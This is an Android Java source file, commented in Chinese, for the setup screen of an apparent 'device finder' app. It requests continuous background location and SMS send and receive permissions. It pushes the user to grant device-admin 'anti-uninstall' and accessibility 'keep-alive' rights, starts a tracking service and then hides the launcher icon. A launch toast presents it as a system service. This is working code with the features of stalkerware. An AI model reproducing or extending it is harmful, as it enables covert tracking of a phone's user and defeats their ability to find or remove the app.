/*
 * ============================================================
 *  MainActivity.java — 引导流程入口
 * ------------------------------------------------------------
 *  构建版本 : 20261106-1430
 *  协议版本 : v2 (对应 BuildInfo.PROTOCOL_VERSION)
 *  最后修改 : 2026-11-06
 * ------------------------------------------------------------
 *  【本次变更 (2026-11-06)】
 *   - 修复无障碍引导"一闪而过"：Dialog 回调内收尾，不再提前 finish()
 *   - 修复 onCreate + onResume 双调用导致弹框叠加
 *   - 修复权限回调 grantResults[0] 死循环（改为遍历全部结果）
 *   - 修复精确闹钟反复询问（alarmAsked 标志，只问一次）
 *   - 修复 API 29 后台定位拒绝死循环（REQ_BG_LOCATION 独立回调）
 *   - 修复通知权限复用 REQ_PERMISSIONS 导致的后台定位回环
 *   - 修复隐藏图标异常阻断 Toast / finish（try/catch 兜底）
 *   - 新增 onSaveInstanceState 状态保存，防系统回收后流程重走
 *
 *  【核心约束（改代码前必读）】
 *   - 无障碍可跳过，不强制
 *   - 无论是否开启无障碍，桌面图标都会隐藏（弹框正文已告知）
 *   - 不提示拨号暗号，用户重进靠"系统设置 → 应用管理 → 打开"
 *   - onCreate 不得调 checkAndRequestPermissions()（会双弹窗）
 *   - 所有"跳设置页"必须用 waitingForXxx 标志，否则返回后状态丢失
 *
 *  【流程概览】
 *   精确闹钟 → 运行时权限 → 后台定位 → 通知权限
 *   → 电池优化 → 悬浮窗 → 设备管理 → 无障碍 → 收尾
 *   详见 docs/main-activity-flow.md
 * ============================================================
 */

package com.example.devicefinder;

import android.Manifest;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSIONS = 100;     // 运行时权限主请求
    private static final int REQ_NOTIFICATION = 101;    // 通知权限（独立，避免回环）
    private static final int REQ_BG_LOCATION = 102;     // 后台定位（API29 专用，断开死循环）

    // ===== 流程核心状态 =====
    // serviceStarted：服务已发起启动。置 true 前必须 try/catch，失败回滚 false，避免用户重进无法重试。
    //                  为 true 时 onResume 直接 finish()，防止系统重建后重走流程。
    private boolean serviceStarted = false;
    // alarmAsked：精确闹钟是否已问过。只问一次，拒绝/返回后不再重复弹。
    private boolean alarmAsked = false;
    // permissionRetryCount：防御性兜底。正常流程不会触发 >=2 分支。
    private int permissionRetryCount = 0;

    // ===== 等待标志位 =====
    // 用法：置 true 表示"已跳设置页，等待用户返回"；onResume 命中对应分支后第一步清 false，再往下走。
    // 若 Activity 被系统回收，onSaveInstanceState 会一起保存恢复。
    private boolean waitingForAlarmSetting = false;          // 等：精确闹钟设置页
    private boolean waitingForBgLocSetting = false;          // 等：应用详情页（后台定位）
    private boolean waitingForBatterySetting = false;        // 等：电池优化白名单设置
    private boolean waitingForOverlaySetting = false;        // 等：悬浮窗权限设置页
    private boolean waitingForDeviceAdmin = false;           // 等：设备管理器激活页
    private boolean waitingForAccessibilitySetting = false;  // 等：无障碍设置页（流程最后一步）

    /**
     * 【Activity 创建】不在此弹任何框——所有流程由 onResume 驱动。
     * 原因：onCreate + onResume 双调用会导致精确闹钟 Dialog 与系统权限框叠加。
     * 若系统内存回收后重建，从 savedInstanceState 恢复全部状态，流程无缝继续。
     */
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (getIntent() != null && getIntent().getCategories() != null
                && getIntent().getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
            Toast.makeText(this, "🛡️ 系统服务初始化中", Toast.LENGTH_SHORT).show();
        }

        if (savedInstanceState != null) {
            serviceStarted = savedInstanceState.getBoolean("serviceStarted", false);
            alarmAsked = savedInstanceState.getBoolean("alarmAsked", false);
            permissionRetryCount = savedInstanceState.getInt("permissionRetryCount", 0);
            waitingForBgLocSetting = savedInstanceState.getBoolean("waitingForBgLocSetting", false);
            waitingForBatterySetting = savedInstanceState.getBoolean("waitingForBatterySetting", false);
            waitingForDeviceAdmin = savedInstanceState.getBoolean("waitingForDeviceAdmin", false);
            waitingForOverlaySetting = savedInstanceState.getBoolean("waitingForOverlaySetting", false);
            waitingForAccessibilitySetting = savedInstanceState.getBoolean("waitingForAccessibilitySetting", false);
            waitingForAlarmSetting = savedInstanceState.getBoolean("waitingForAlarmSetting", false);
            FileLogger.log(this, "MAIN", "♻️ Activity 重建，恢复状态: "
                    + "serviceStarted=" + serviceStarted
                    + ", waitingForAcc=" + waitingForAccessibilitySetting);
        }
    }

    /**
     * 【状态保存】仅服务"系统内存回收后重建"场景。
     * 用户主动关闭 App 再打开时 savedInstanceState == null，不受影响，完整引导会重新走一遍
     * ——这保证了"跳过无障碍后从系统设置补开"的入口不被切断。
     */
    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        outState.putBoolean("serviceStarted", serviceStarted);
        outState.putBoolean("alarmAsked", alarmAsked);
        outState.putInt("permissionRetryCount", permissionRetryCount);
        outState.putBoolean("waitingForBgLocSetting", waitingForBgLocSetting);
        outState.putBoolean("waitingForBatterySetting", waitingForBatterySetting);
        outState.putBoolean("waitingForDeviceAdmin", waitingForDeviceAdmin);
        outState.putBoolean("waitingForOverlaySetting", waitingForOverlaySetting);
        outState.putBoolean("waitingForAccessibilitySetting", waitingForAccessibilitySetting);
        outState.putBoolean("waitingForAlarmSetting", waitingForAlarmSetting);
    }

    /**
     * 【流程总调度】所有"从设置页返回"的处理都集中在此，按 waitingFor 标志分发。
     * 执行顺序：精确闹钟 → 设备管理 → 悬浮窗 → 电池优化 → 后台定位 → 无障碍 → 首次进入。
     * 最后兜底：serviceStarted=true 时直接 finish()，防止系统重建后用户看到空白页。
     */
    @Override
    protected void onResume() {
        super.onResume();

        if (waitingForAlarmSetting) {
            waitingForAlarmSetting = false;
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            boolean ok = am != null && am.canScheduleExactAlarms();
            if (ok) {
                Toast.makeText(this, "✅ 精确闹钟已开启", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ 未开启精确闹钟，上报时间可能不准", Toast.LENGTH_LONG).show();
            }
            checkAndRequestPermissions();
            return;
        }

        if (waitingForDeviceAdmin) {
            waitingForDeviceAdmin = false;
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                Toast.makeText(this, "✅ 防卸载装甲已激活", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ 未激活防卸载，应用将直接启动", Toast.LENGTH_LONG).show();
            }
            startTrackingServiceAndFinish();
            return;
        }

        if (waitingForOverlaySetting) {
            waitingForOverlaySetting = false;
            if (Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "✅ 悬浮窗权限已开启", Toast.LENGTH_SHORT).show();
            }
            checkDeviceAdmin();
            return;
        }

        if (waitingForBatterySetting) {
            waitingForBatterySetting = false;
            if (isBatteryOptimizationIgnored()) {
                Toast.makeText(this, "✅ 电池优化已关闭", Toast.LENGTH_SHORT).show();
                checkOverlayPermission();
            } else {
                promptBatteryOptimizationAgain();
            }
            return;
        }

        if (waitingForBgLocSetting) {
            waitingForBgLocSetting = false;
            proceedAfterBackgroundLocation();
            return;
        }

        if (waitingForAccessibilitySetting) {
            waitingForAccessibilitySetting = false;
            if (isAccessibilityServiceEnabled()) {
                FileLogger.log(this, "ACCESSIBILITY", "✅ 无障碍已开启（从设置返回）");
                finishWithToast("✅ 设置完成，无障碍服务已开启", Toast.LENGTH_LONG);
            } else {
                FileLogger.log(this, "ACCESSIBILITY", "⚠️ 从设置返回但未开启无障碍");
                finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
            }
            return;
        }

        // 服务已启动过：直接结束，不留空白页
        if (serviceStarted) {
            finish();
            return;
        }

        checkAndRequestPermissions();
    }

    /**
     * 【流程入口】检查并申请运行时权限 + 精确闹钟。
     * - 进入：onResume 首次、或等待标志被清除后回调
     * - 去向：权限全给 / 有拒 都进 checkBgLocThenProceed
     * - 用户可跳过：权限可拒、闹钟可"暂不开启"，都不阻塞
     * - 重入守卫：permissionRetryCount >= 2 直接推进（防御性，正常不触发）
     */
    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT < 23) {
            proceedAfterPermissions();
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmAsked) {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            if (alarmManager != null && !alarmManager.canScheduleExactAlarms()) {
                alarmAsked = true;
                new AlertDialog.Builder(this)
                        .setTitle("建议允许精确闹钟")
                        .setMessage("允许精确闹钟后，手机息屏时定位上报会更准点。\n\n"
                                + "• 点击「去设置」→ 开启「闹钟和提醒」\n"
                                + "• 点击「暂不开启」→ 仍可运行，但上报时间可能有几分钟偏差")
                        .setCancelable(false)
                        .setPositiveButton("去设置", (dialog, which) -> {
                            waitingForAlarmSetting = true;
                            try {
                                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                                intent.setData(Uri.parse("package:" + getPackageName()));
                                startActivity(intent);
                            } catch (Exception e) {
                                waitingForAlarmSetting = false;
                                Toast.makeText(this, "无法打开精确闹钟设置", Toast.LENGTH_SHORT).show();
                                checkAndRequestPermissions();
                            }
                        })
                        .setNegativeButton("暂不开启", (dialog, which) -> checkAndRequestPermissions())
                        .show();
                return;
            }
        }

        boolean needFgLoc = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
        boolean needNotif = Build.VERSION.SDK_INT >= 33 && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED;
        boolean needSms = checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                          checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED;
        boolean needActivity = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACTIVITY_RECOGNITION) != PackageManager.PERMISSION_GRANTED;
        boolean needNearbyWifi = Build.VERSION.SDK_INT >= 33
                && checkSelfPermission("android.permission.NEARBY_WIFI_DEVICES") != PackageManager.PERMISSION_GRANTED;

        if (needFgLoc || needNotif || needSms || needActivity || needNearbyWifi) {
            if (permissionRetryCount >= 2) {
                checkBgLocThenProceed();
                return;
            }
            permissionRetryCount++;

            java.util.List<String> perms = new java.util.ArrayList<>();
            if (needFgLoc) {
                perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
                perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            }
            if (needSms) {
                perms.add(Manifest.permission.RECEIVE_SMS);
                perms.add(Manifest.permission.SEND_SMS);
            }
            if (needActivity) {
                perms.add(Manifest.permission.ACTIVITY_RECOGNITION);
            }
            if (needNotif) {
                perms.add(Manifest.permission.POST_NOTIFICATIONS);
            }
            if (needNearbyWifi) {
                perms.add("android.permission.NEARBY_WIFI_DEVICES");
            }
            requestPermissions(perms.toArray(new String[0]), REQ_PERMISSIONS);
        } else {
            checkBgLocThenProceed();
        }
    }

    /**
     * 【后台定位引导】API 29+ 单独处理——从 30 起系统把它挪到"位置信息-始终允许"。
     * - 去向：需要 → API30+ 弹 Dialog / API29 走 REQ_BG_LOCATION
     *         不需要 → proceedAfterPermissions
     * - 用户可跳过：Dialog 有"暂不开启"；API29 拒绝后在回调进二次确认
     * - 关键：API29 用独立 requestCode，拒绝后绝不回到本方法，避免死循环
     */
    private void checkBgLocThenProceed() {
        boolean needBgLoc = Build.VERSION.SDK_INT >= 29
                && checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED;

        if (needBgLoc) {
            if (Build.VERSION.SDK_INT >= 30) {
                new AlertDialog.Builder(this)
                        .setTitle("设置后台定位")
                        .setMessage("请在下个页面选择「权限」→「位置信息」→「始终允许」。")
                        .setCancelable(false)
                        .setPositiveButton("去设置", (dialog, which) -> {
                            waitingForBgLocSetting = true;
                            try {
                                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                intent.setData(Uri.parse("package:" + getPackageName()));
                                startActivity(intent);
                            } catch (Exception e) {
                                waitingForBgLocSetting = false;
                                proceedAfterBackgroundLocation();
                            }
                        }).show();
            } else {
                requestPermissions(
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                        REQ_BG_LOCATION);
            }
            return;
        }

        proceedAfterPermissions();
    }

    /**
     * 【后台定位二次确认】用户从后台定位设置返回时，检查实际是否开启。
     * - 进入：onResume 命中 waitingForBgLocSetting；或 API29 REQ_BG_LOCATION 回调
     * - 去向：已开 → checkNotifThenProceed；未开 → 弹二次确认
     * - 用户可跳过："暂不开启" → checkNotifThenProceed
     * - 作用：修复"用户从设置返回但没开成，流程照样推进"的假完成 bug
     */
    private void proceedAfterBackgroundLocation() {
        boolean bgLocOk = Build.VERSION.SDK_INT < 29
                || checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (!bgLocOk) {
            new AlertDialog.Builder(this)
                    .setTitle("后台定位未开启")
                    .setMessage("锁屏后可能无法定位。是否重新去设置？\n\n"
                            + "进入后请找到「位置信息」→ 选择「始终允许」。")
                    .setCancelable(false)
                    .setPositiveButton("再去设置", (dialog, which) -> {
                        waitingForBgLocSetting = true;
                        try {
                            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                        } catch (Exception e) {
                            waitingForBgLocSetting = false;
                            FileLogger.log(this, "LOCATION",
                                    "⚠️ 打开后台定位设置失败: " + e.getMessage());
                            checkNotifThenProceed();
                        }
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> {
                        Toast.makeText(this, "⚠️ 未开启后台定位，锁屏后可能无法定位", Toast.LENGTH_LONG).show();
                        checkNotifThenProceed();
                    })
                    .show();
            return;
        }

        checkNotifThenProceed();
    }

    /**
     * 【通知权限】Android 13+ 单独请求 POST_NOTIFICATIONS。
     * - 去向：需要 → REQ_NOTIFICATION；不需要 → proceedAfterPermissions
     * - 用户可跳过：拒绝后在回调直接 proceedAfterPermissions，不回头重请
     * - 关键：独立 requestCode，避免复用 REQ_PERMISSIONS 触发后台定位回环
     */
    private void checkNotifThenProceed() {
        if (Build.VERSION.SDK_INT >= 33
                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIFICATION);
        } else {
            proceedAfterPermissions();
        }
    }

    /**
     * 【权限回调总入口】按 requestCode 分发。
     * - REQ_BG_LOCATION：无论给没给，都进 proceedAfterBackgroundLocation（断开 API29 循环）
     * - REQ_NOTIFICATION：给/拒都进 proceedAfterPermissions（不回头重请）
     * - REQ_PERMISSIONS：全部给了才重置计数；有任何一个拒就进 checkBgLocThenProceed
     */
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQ_BG_LOCATION) {
            proceedAfterBackgroundLocation();
            return;
        }

        if (requestCode == REQ_NOTIFICATION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "✅ 通知权限已开启", Toast.LENGTH_SHORT).show();
            }
            proceedAfterPermissions();
            return;
        }

        if (requestCode != REQ_PERMISSIONS) return;

        boolean allGranted = grantResults.length > 0;
        for (int r : grantResults) {
            if (r != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            permissionRetryCount = 0;
            checkAndRequestPermissions();
        } else {
            Toast.makeText(this, "⚠️ 部分权限未授予，可能影响后台存活", Toast.LENGTH_LONG).show();
            checkBgLocThenProceed();
        }
    }

    /**
     * 【流程汇聚点】权限/后台定位/通知全部处理完后，进入电池优化检查。
     * - 去向：已优化 → checkOverlayPermission；未优化 → promptBatteryOptimization
     */
    private void proceedAfterPermissions() {
        if (isBatteryOptimizationIgnored()) {
            checkOverlayPermission();
        } else {
            promptBatteryOptimization();
        }
    }

    private boolean isBatteryOptimizationIgnored() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 【电池优化引导（首次）】
     * - 去向：去设置 → waitingForBatterySetting=true；暂时跳过 → checkOverlayPermission
     * - 用户可跳过：有"暂时跳过"
     */
    private void promptBatteryOptimization() {
        new AlertDialog.Builder(this)
                .setTitle("必须关闭电池优化")
                .setMessage("为保证息屏后仍能持续上报位置，\n请将本应用设为「不限制」。")
                .setCancelable(false)
                .setPositiveButton("去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("暂时跳过", (dialog, which) -> checkOverlayPermission()).show();
    }

    /**
     * 【电池优化引导（用户返回后仍未开）】
     * - 进入：onResume 命中 waitingForBatterySetting，但设置页里没改
     * - 去向：再去设置 → 再等；放弃 → checkOverlayPermission
     */
    private void promptBatteryOptimizationAgain() {
        new AlertDialog.Builder(this)
                .setTitle("电池优化仍未关闭")
                .setMessage("系统限制尚未解除，息屏后可能无法定位。")
                .setCancelable(false)
                .setPositiveButton("再去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("放弃", (dialog, which) -> checkOverlayPermission()).show();
    }

    private void openBatteryOptimizationSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            if (intent.resolveActivity(getPackageManager()) != null) {
                startActivity(intent);
            } else {
                startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
            }
        } catch (Exception e) {
            waitingForBatterySetting = false;
            checkOverlayPermission();
        }
    }

    /**
     * 【悬浮窗引导】
     * - 去向：需要且未给 → 弹框；已给或用户跳过 → checkDeviceAdmin
     * - 用户可跳过：有"暂不开启"
     */
    private void checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            new AlertDialog.Builder(this)
                    .setTitle("开启悬浮窗权限")
                    .setMessage("用于提升后台存活率和显示提示，请在下一页允许「显示在其他应用上层」。")
                    .setCancelable(false)
                    .setPositiveButton("去开启", (dialog, which) -> {
                        waitingForOverlaySetting = true;
                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> checkDeviceAdmin()).show();
        } else {
            checkDeviceAdmin();
        }
    }

    /**
     * 【设备管理器引导（防卸载）】
     * - 去向：已激活 → startTrackingServiceAndFinish；未激活 → 弹框
     * - 用户可跳过：有"暂不开启"（会 Toast 提示未开启保护）
     */
    private void checkDeviceAdmin() {
        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);

        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
            new AlertDialog.Builder(this)
                    .setTitle("开启防卸载保护")
                    .setMessage("为防止应用被恶意卸载，请在下个页面点击「激活」。")
                    .setCancelable(false)
                    .setPositiveButton("去激活", (dialog, which) -> {
                        waitingForDeviceAdmin = true;
                        Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活后可防止应用被轻易卸载");
                        try {
                            startActivity(intent);
                        } catch (Exception e) {
                            waitingForDeviceAdmin = false;
                            startTrackingServiceAndFinish();
                        }
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> {
                        Toast.makeText(this, "⚠️ 未开启防卸载保护", Toast.LENGTH_LONG).show();
                        startTrackingServiceAndFinish();
                    }).show();
        } else {
            startTrackingServiceAndFinish();
        }
    }

    /**
     * 【无障碍状态查询】判断本 App 的无障碍服务是否在系统里被勾选。
     * - 用 split(":") + equalsIgnoreCase，避免 "pkg/pkg.MyAccessibilityService2"
     *   这类前缀相似的组件误判
     * - 读取失败返回 false（宁可重弹一次，也不误以为已开）
     */
    private boolean isAccessibilityServiceEnabled() {
        final String service = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
        try {
            String enabledServices = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServices == null) return false;
            for (String s : enabledServices.split(":")) {
                if (s.equalsIgnoreCase(service)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 【启动核心服务 + 进入无障碍引导】流程倒数第二步。
     * - 去向：服务启动成功 → checkAndOpenAccessibilitySettingsAndFinish
     *         启动失败 → serviceStarted 回滚 + Toast + finish（不隐藏图标）
     * - 失败保护：startForegroundService 极端场景抛异常时，用户重进 App 可重试
     */
    private void startTrackingServiceAndFinish() {
        if (serviceStarted) {
            finish();
            return;
        }
        serviceStarted = true;
        Intent intent = new Intent(this, TrackingService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            serviceStarted = false;
            FileLogger.log(this, "START_SERVICE", "启动失败: " + e);
            Toast.makeText(this, "服务启动失败，未隐藏图标", Toast.LENGTH_LONG).show();
            finish();
            return;
        }
        checkAndOpenAccessibilitySettingsAndFinish();
    }

    /**
     * 【无障碍引导 + 全流程收尾】流程最后一步。
     * - 三种完成路径：
     *   ① 已开 → 直接 finishWithToast("无障碍服务已开启")
     *   ② 去开启→返回→已开 → 由 onResume 的 waitingForAccessibilitySetting 分支收尾
     *   ③ 暂不开启/返回键/点空白 → finishWithToast("无障碍未开启")
     * - 用户可跳过：setCancelable(true) + 有"暂不开启"按钮
     * - 无论是否开启，都隐藏桌面图标（符合产品决策）
     */
    private void checkAndOpenAccessibilitySettingsAndFinish() {
        if (isAccessibilityServiceEnabled()) {
            FileLogger.log(this, "ACCESSIBILITY", "✅ 无障碍服务已开启（跳过引导）");
            finishWithToast("✅ 设置完成，无障碍服务已开启", Toast.LENGTH_LONG);
            return;
        }

        new AlertDialog.Builder(this)
                .setTitle("开启无障碍保活服务（推荐）")
                .setMessage("为保证 App 被系统清理后能自动复活，推荐开启无障碍服务。\n\n"
                        + "• 点击「去开启」跳转到无障碍设置，找到【" + getString(R.string.app_name) + "】并勾选开启\n"
                        + "• 点击「暂不开启」或按返回键跳过本次引导\n\n"
                        + "无论是否开启，完成后桌面图标都会自动隐藏。")
                .setCancelable(true)
                .setPositiveButton("去开启", (dialog, which) -> {
                    waitingForAccessibilitySetting = true;
                    try {
                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                    } catch (Exception e) {
                        waitingForAccessibilitySetting = false;
                        FileLogger.log(this, "ACCESSIBILITY", "⚠️ 无法打开无障碍设置: " + e.getMessage());
                        finishWithToast("设置无法打开", Toast.LENGTH_SHORT);
                    }
                })
                .setNegativeButton("暂不开启", (dialog, which) -> {
                    FileLogger.log(this, "ACCESSIBILITY", "⚠️ 用户主动跳过无障碍");
                    finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
                })
                .setOnCancelListener(dialog -> {
                    FileLogger.log(this, "ACCESSIBILITY", "⚠️ 用户按返回键跳过无障碍");
                    finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
                })
                .show();
    }

    /**
     * 【统一收尾】隐藏图标 + Toast + finish。
     * - Toast 用 Application Context：Activity finish 后 Toast 不会被销毁
     * - hideLauncherIcon 包 try/catch：隐藏失败不影响 Toast 和 finish
     * - 所有无障碍出口都走这里，保证行为一致
     */
    private void finishWithToast(String msg, int duration) {
        try {
            hideLauncherIcon();
        } catch (Exception e) {
            FileLogger.log(this, "ICON", "隐藏图标失败: " + e);
        }
        Toast.makeText(getApplicationContext(), msg, duration).show();
        finish();
    }

    private void hideLauncherIcon() {
        FileLogger.log(this, "ICON", "隐藏桌面图标");
        LauncherIconUtils.setLauncherIconVisible(this, false);
    }
}
